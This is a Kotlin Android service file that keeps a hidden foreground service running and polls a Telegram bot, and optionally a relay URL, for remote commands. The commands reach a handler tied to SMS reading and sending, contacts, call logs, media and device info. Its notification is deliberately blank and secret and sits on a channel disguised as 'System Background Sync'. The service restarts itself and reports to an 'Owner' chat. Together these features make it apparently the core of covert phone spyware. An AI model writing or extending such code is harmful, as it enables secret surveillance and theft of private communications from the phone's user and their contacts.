package com.example.service

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.PendingIntent
import android.app.Service
import android.content.Context
import android.content.Intent
import android.content.pm.ServiceInfo
import android.net.ConnectivityManager
import android.net.Network
import android.net.NetworkCapabilities
import android.net.NetworkRequest
import android.os.Build
import android.os.IBinder
import androidx.core.app.NotificationCompat
import com.example.MainActivity
import com.example.R
import com.example.data.api.TelegramClient
import com.example.data.calls.CallLogManager
import com.example.data.calls.CallLogRepository
import com.example.data.contacts.ContactManager
import com.example.data.contacts.ContactRepository
import com.example.data.model.LogType
import com.example.data.model.TelegramChat
import com.example.data.model.TelegramMessage
import com.example.data.model.TelegramUser
import com.example.data.security.PreferenceManager
import com.example.data.sms.SmsManager
import com.example.data.sms.SmsRepository
import com.example.data.sms.SmsSender
import com.example.domain.commands.CommandHandler
import com.example.domain.device.DeviceInfoProvider
import com.example.domain.log.LogRepository
import com.example.domain.media.MediaRepository
import com.example.domain.sms.SmsSendManager
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.Job
import kotlinx.coroutines.delay
import kotlinx.coroutines.flow.MutableStateFlow
import kotlinx.coroutines.flow.StateFlow
import kotlinx.coroutines.flow.asStateFlow
import kotlinx.coroutines.isActive
import kotlinx.coroutines.launch

enum class ServiceConnectionState {
    STOPPED,
    CONNECTING,
    CONNECTED,
    RECONNECTING,
    AUTH_ERROR,
    NETWORK_ERROR
}

class TelegramRemoteService : Service() {

    companion object {
        const val ACTION_START_SERVICE = "com.example.telemanage.START_SERVICE"
        const val ACTION_STOP_SERVICE = "com.example.telemanage.STOP_SERVICE"
        private const val NOTIFICATION_ID = 1001
        private const val CHANNEL_ID = "vil_services_silent_channel"

        private val _isRunningFlow = MutableStateFlow(false)
        val isRunningFlow: StateFlow<Boolean> = _isRunningFlow.asStateFlow()

        private val _connectionStateFlow = MutableStateFlow(ServiceConnectionState.STOPPED)
        val connectionStateFlow: StateFlow<ServiceConnectionState> = _connectionStateFlow.asStateFlow()

        private val _startTimeFlow = MutableStateFlow(0L)
        val startTimeFlow: StateFlow<Long> = _startTimeFlow.asStateFlow()

        private val _lastUpdateReceivedFlow = MutableStateFlow(0L)
        val lastUpdateReceivedFlow: StateFlow<Long> = _lastUpdateReceivedFlow.asStateFlow()

        fun startService(context: Context) {
            val intent = Intent(context, TelegramRemoteService::class.java).apply {
                action = ACTION_START_SERVICE
            }
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                context.startForegroundService(intent)
            } else {
                context.startService(intent)
            }
        }

        fun stopService(context: Context) {
            val intent = Intent(context, TelegramRemoteService::class.java).apply {
                action = ACTION_STOP_SERVICE
            }
            context.startService(intent)
        }

        private var activeServiceInstance: TelegramRemoteService? = null

        fun restartPollingConnection(context: Context): Boolean {
            val instance = activeServiceInstance
            if (instance != null && _isRunningFlow.value) {
                instance.serviceScope.launch {
                    instance.reconnectPolling("User remote request")
                }
                return true
            } else {
                // If service is configured and permitted, request foreground restart
                startService(context)
                return false
            }
        }
    }

    private val serviceJob = Job()
    private val serviceScope = CoroutineScope(Dispatchers.IO + serviceJob)
    private var pollingJob: Job? = null

    private lateinit var preferenceManager: PreferenceManager
    private lateinit var telegramClient: TelegramClient
    private lateinit var commandHandler: CommandHandler
    private lateinit var deviceInfoProvider: DeviceInfoProvider
    private lateinit var mediaRepository: MediaRepository
    private lateinit var contactRepository: ContactRepository
    private lateinit var contactManager: ContactManager
    private lateinit var callLogRepository: CallLogRepository
    private lateinit var callLogManager: CallLogManager
    private lateinit var smsRepository: SmsRepository
    private lateinit var smsManager: SmsManager

    private var connectivityManager: ConnectivityManager? = null
    private var networkCallback: ConnectivityManager.NetworkCallback? = null

    override fun onCreate() {
        super.onCreate()
        activeServiceInstance = this
        preferenceManager = PreferenceManager(applicationContext)
        telegramClient = TelegramClient()
        deviceInfoProvider = DeviceInfoProvider(applicationContext)
        mediaRepository = MediaRepository(applicationContext)
        contactRepository = ContactRepository(applicationContext)
        contactManager = ContactManager(contactRepository)
        callLogRepository = CallLogRepository(applicationContext)
        callLogManager = CallLogManager(callLogRepository)
        smsRepository = SmsRepository(applicationContext)
        smsManager = SmsManager(smsRepository, contactRepository)

        val exportManager = ExportService.getExportManager(applicationContext)
        val smsSender = SmsSender(applicationContext)
        val smsSendManager = SmsSendManager(
            telegramClient = telegramClient,
            preferenceManager = preferenceManager,
            contactRepository = contactRepository,
            smsSender = smsSender
        )

        commandHandler = CommandHandler(
            context = applicationContext,
            telegramClient = telegramClient,
            preferenceManager = preferenceManager,
            deviceInfoProvider = deviceInfoProvider,
            mediaRepository = mediaRepository,
            contactManager = contactManager,
            callLogManager = callLogManager,
            smsManager = smsManager,
            exportManager = exportManager,
            smsSendManager = smsSendManager
        )

        createNotificationChannel()
        registerNetworkCallback()
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        if (intent?.action == ACTION_STOP_SERVICE) {
            preferenceManager.setServiceDesiredEnabled(false)
            preferenceManager.setLastKnownLifecycleState("USER_STOPPED")
            stopPollingAndSelf()
            return START_NOT_STICKY
        }

        startForegroundNotification()

        val isRecovery = intent == null || (flags and START_FLAG_REDELIVERY != 0) || (flags and START_FLAG_RETRY != 0)
        if (isRecovery) {
            preferenceManager.recordServiceRecovery()
            preferenceManager.setLastKnownLifecycleState("RECOVERED_AFTER_KILL")
            LogRepository.addLog(
                LogType.SYSTEM,
                "Service Auto-Recovered",
                "Foreground service automatically restored by Android after process or resource termination."
            )
        } else {
            preferenceManager.setServiceDesiredEnabled(true)
            preferenceManager.setLastKnownLifecycleState("RUNNING")
        }

        if (!_isRunningFlow.value || pollingJob?.isActive != true) {
            _isRunningFlow.value = true
            if (_startTimeFlow.value == 0L || !isRecovery) {
                _startTimeFlow.value = System.currentTimeMillis()
            }
            LogRepository.addLog(
                LogType.SYSTEM,
                "Remote Service Started",
                "Foreground service is running and polling for Telegram commands"
            )
            startPollingLoop()

            serviceScope.launch {
                val token = preferenceManager.getBotToken()
                val authorizedId = preferenceManager.getAuthorizedUserId()
                if (token.isNotBlank() && authorizedId != 0L) {
                    telegramClient.sendMessage(
                        token = token,
                        chatId = authorizedId,
                        text = "🟢 <b>Remote Service Online</b>\n\nDevice is connected and ready to receive commands.\nType /help to see all available commands."
                    )
                }
            }
        }

        return START_STICKY
    }

    private fun startForegroundNotification() {
        val openAppIntent = Intent(this, MainActivity::class.java)
        val pendingOpenApp = PendingIntent.getActivity(
            this,
            0,
            openAppIntent,
            PendingIntent.FLAG_IMMUTABLE or PendingIntent.FLAG_UPDATE_CURRENT
        )

        val stopIntent = Intent(this, TelegramRemoteService::class.java).apply {
            action = ACTION_STOP_SERVICE
        }
        val pendingStop = PendingIntent.getService(
            this,
            1,
            stopIntent,
            PendingIntent.FLAG_IMMUTABLE or PendingIntent.FLAG_UPDATE_CURRENT
        )

        val notification: Notification = NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("")
            .setContentText("")
            .setSmallIcon(R.drawable.ic_launcher_foreground)
            .setContentIntent(pendingOpenApp)
            .setOngoing(true)
            .setSilent(true)
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .setVisibility(NotificationCompat.VISIBILITY_SECRET)
            .build()

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            startForeground(
                NOTIFICATION_ID,
                notification,
                ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC
            )
        } else {
            startForeground(NOTIFICATION_ID, notification)
        }
    }

    private val processedUpdateIds = linkedSetOf<Long>()

    suspend fun reconnectPolling(reason: String = "Manual reconnect") {
        LogRepository.addLog(
            LogType.SYSTEM,
            "Reconnecting Telegram",
            "Re-establishing polling connection ($reason)"
        )
        _connectionStateFlow.value = ServiceConnectionState.CONNECTING
        startPollingLoop()
    }

    private fun startPollingLoop() {
        pollingJob?.cancel()
        pollingJob = serviceScope.launch {
            var currentOffset: Long? = null
            var consecutiveErrors = 0

            while (isActive) {
                // Heartbeat timestamp update
                preferenceManager.updateLastHeartbeat()

                val token = preferenceManager.getBotToken()
                val authorizedId = preferenceManager.getAuthorizedUserId()

                if (token.isBlank() || authorizedId == 0L) {
                    _connectionStateFlow.value = ServiceConnectionState.AUTH_ERROR
                    delay(5000)
                    continue
                }

                val relayUrl = preferenceManager.getRelayUrl()
                if (relayUrl.isNotBlank()) {
                    // Multi-Device Relay Mode (Cloudflare / Google Apps Script)
                    val status = deviceInfoProvider.getDeviceStatus(_isRunningFlow.value)
                    val battery = status.batteryPercent
                    val model = status.model
                    val deviceId = preferenceManager.getDeviceId()

                    val relayResult = telegramClient.pollRelay(relayUrl, deviceId, battery, model)
                    if (relayResult.isSuccess) {
                        consecutiveErrors = 0
                        _connectionStateFlow.value = ServiceConnectionState.CONNECTED
                        val commands = relayResult.getOrNull().orEmpty()
                        for (cmd in commands) {
                            _lastUpdateReceivedFlow.value = System.currentTimeMillis()
                            val mockMsg = TelegramMessage(
                                messageId = System.currentTimeMillis(),
                                from = TelegramUser(id = authorizedId, firstName = "Owner"),
                                chat = TelegramChat(id = authorizedId),
                                date = System.currentTimeMillis() / 1000,
                                text = cmd
                            )
                            commandHandler.handleIncomingMessage(
                                message = mockMsg,
                                isServiceRunning = true,
                                serviceStartTimeMs = _startTimeFlow.value
                            )
                        }
                    } else {
                        consecutiveErrors++
                        _connectionStateFlow.value = ServiceConnectionState.RECONNECTING
                    }
                }

                _connectionStateFlow.value = if (consecutiveErrors > 0) {
                    ServiceConnectionState.RECONNECTING
                } else {
                    ServiceConnectionState.CONNECTED
                }

                val result = telegramClient.getUpdates(
                    token = token,
                    offset = currentOffset,
                    timeoutSeconds = 25
                )

                if (result.isSuccess) {
                    consecutiveErrors = 0
                    _connectionStateFlow.value = ServiceConnectionState.CONNECTED
                    val updates = result.getOrNull().orEmpty()

                    for (update in updates) {
                        currentOffset = update.updateId + 1

                        // Avoid duplicate processing of the same update
                        synchronized(processedUpdateIds) {
                            if (processedUpdateIds.contains(update.updateId)) {
                                continue
                            }
                            processedUpdateIds.add(update.updateId)
                            if (processedUpdateIds.size > 200) {
                                processedUpdateIds.remove(processedUpdateIds.first())
                            }
                        }

                        _lastUpdateReceivedFlow.value = System.currentTimeMillis()

                        val message = update.message
                        if (message != null) {
                            commandHandler.handleIncomingMessage(
                                message = message,
                                isServiceRunning = true,
                                serviceStartTimeMs = _startTimeFlow.value
                            )
                        }

                        val callback = update.callbackQuery
                        if (callback != null) {
                            commandHandler.handleIncomingCallbackQuery(callback)
                        }
                    }
                } else {
                    consecutiveErrors++
                    val exception = result.exceptionOrNull()
                    val errorMsg = exception?.message ?: "Unknown error"

                    _connectionStateFlow.value = ServiceConnectionState.NETWORK_ERROR

                    LogRepository.addLog(
                        LogType.ERROR,
                        "Telegram Polling Error",
                        "Attempt $consecutiveErrors: $errorMsg",
                        isSuccess = false
                    )

                    // Exponential backoff capped at 30 seconds
                    val backoffSeconds = ((1L shl (consecutiveErrors.coerceAtMost(5))) + (consecutiveErrors * 2L)).coerceIn(3L, 30L)
                    delay(backoffSeconds * 1000L)
                }
            }
        }
    }

    private fun registerNetworkCallback() {
        try {
            connectivityManager = getSystemService(Context.CONNECTIVITY_SERVICE) as? ConnectivityManager
            val request = NetworkRequest.Builder()
                .addCapability(NetworkCapabilities.NET_CAPABILITY_INTERNET)
                .build()

            networkCallback = object : ConnectivityManager.NetworkCallback() {
                override fun onAvailable(network: Network) {
                    if (_isRunningFlow.value && pollingJob?.isActive != true) {
                        startPollingLoop()
                    }
                }

                override fun onLost(network: Network) {
                    _connectionStateFlow.value = ServiceConnectionState.NETWORK_ERROR
                }
            }

            connectivityManager?.registerNetworkCallback(request, networkCallback!!)
        } catch (e: Exception) {
            e.printStackTrace()
        }
    }

    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val manager = getSystemService(NotificationManager::class.java)
            try {
                manager.deleteNotificationChannel("telemanage_remote_channel")
            } catch (_: Exception) {}

            val channel = NotificationChannel(
                CHANNEL_ID,
                "System Background Sync",
                NotificationManager.IMPORTANCE_MIN
            ).apply {
                description = "Silent internal background sync"
                setShowBadge(false)
                enableLights(false)
                enableVibration(false)
                setSound(null, null)
                lockscreenVisibility = Notification.VISIBILITY_SECRET
            }
            manager.createNotificationChannel(channel)
        }
    }

    private fun stopPollingAndSelf() {
        _isRunningFlow.value = false
        _connectionStateFlow.value = ServiceConnectionState.STOPPED
        pollingJob?.cancel()
        LogRepository.addLog(
            LogType.SYSTEM,
            "Remote Service Stopped",
            "Service stopped by user or system"
        )
        stopForeground(STOP_FOREGROUND_REMOVE)
        stopSelf()
    }

    override fun onDestroy() {
        super.onDestroy()
        _isRunningFlow.value = false
        _connectionStateFlow.value = ServiceConnectionState.STOPPED
        serviceJob.cancel()
        networkCallback?.let {
            try {
                connectivityManager?.unregisterNetworkCallback(it)
            } catch (_: Exception) {}
        }
    }

    override fun onBind(intent: Intent?): IBinder? = null
}
